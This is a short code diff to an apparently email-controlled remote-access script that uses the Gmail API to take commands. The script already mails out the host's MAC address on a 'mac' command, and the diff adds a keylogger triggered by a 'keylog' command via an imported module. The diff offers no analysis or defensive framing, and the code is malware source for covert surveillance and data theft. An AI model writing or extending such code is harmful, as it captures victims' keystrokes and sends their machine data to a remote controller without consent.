@@ -14,6 +14,7 @@ from bs4 import BeautifulSoup
 import uuid
 from email.mime.text import MIMEText
 from requests import HTTPError
+import k as kls
 
 # If modifying these scopes, delete the file token.json.
 SCOPES = [
@@ -136,6 +137,9 @@ def mark_as_read(service, m):
 def mac_address():
     send_mail("mac:", hex(uuid.getnode()))
     return
+def key_logger():
+    kls.keylogger()
+    return
 
 def Connect():
     while True:
@@ -146,6 +150,8 @@ def Connect():
         #     return
         if "mac" in cmd:
             mac_address()
+        if "keylog" in cmd:
+            key_logger()
         # elif "KEYLOG" in msg:
         #     keylogger()
         # elif "DIRECTORY" in msg:
